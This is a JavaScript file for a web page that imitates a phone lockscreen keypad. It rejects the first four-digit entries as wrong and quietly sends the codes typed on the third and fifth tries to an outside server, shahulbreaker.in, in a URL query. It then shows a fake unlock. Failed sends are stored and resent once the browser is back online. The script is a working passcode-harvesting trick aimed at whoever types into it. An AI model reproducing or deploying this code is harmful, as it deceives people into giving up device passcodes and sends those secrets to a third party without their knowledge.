(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const appGrid = document.getElementById('appGrid');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  // ---------- Animation helpers ----------
  let iconsGenerated = false;

  function createAppIcons(count = 20) {
    if (!appGrid || iconsGenerated) return;
    iconsGenerated = true;

    for (let i = 0; i < count; i++) {
      const icon = document.createElement('div');
      icon.className = 'app-icon';
      const base = 60 + (i * 28);
      const jitter = Math.floor(Math.random() * 120);
      const delay = base + jitter;
      icon.style.setProperty('--delay', `${delay}ms`);
      icon.dataset.delay = `${delay}ms`;

      const glyph = document.createElement('div');
      glyph.className = 'glyph';
      const hue = Math.floor(Math.random() * 360);
      glyph.style.background = `linear-gradient(180deg, hsl(${hue} 80% 92%) 0%, hsl(${(hue+10)%360} 80% 70%) 100%)`;
      glyph.style.opacity = 0.98;

      icon.appendChild(glyph);
      appGrid.appendChild(icon);
    }
  }

  function kickIconAnimation() {
    if (!appGrid) return;
    const icons = Array.from(appGrid.querySelectorAll('.app-icon'));
    icons.forEach((ic, idx) => {
      const delay = ic.dataset.delay || `${idx * 40}ms`;
      ic.style.animationDelay = delay;
      ic.classList.add('animate');
    });
  }

  // NEW: realistic "lift the lockscreen like a curtain" reveal
  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;

    // Step 1: show the homescreen overlay (behind lockscreen) so it's ready underneath
    unlockOverlay.classList.add('show');
    unlockOverlay.setAttribute('aria-hidden', 'false');

    // Step 2: create icons (once)
    createAppIcons(20);

    // Step 3: small timeout then animate the icons + lift the lockscreen
    // We lift the lockscreen (add unlocking class) — CSS handles strong blur & translateY on ::before
    // icons are animated slightly after to create a natural reveal
    setTimeout(() => {
      lockEl.classList.add('unlocking'); // this triggers translateY and wallpaper blur via CSS
    }, 40);

    // start icons slightly after the lockscreen begins moving
    setTimeout(() => {
      kickIconAnimation();
    }, 220);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    if (attempts === 3) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      // 5th attempt: send, then play realistic reveal (lift + blur)
      sendToAPI(enteredCode);
      playUnlockAnimation();
      setTimeout(reset, 300);
    } else {
      animateWrongAttempt();
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
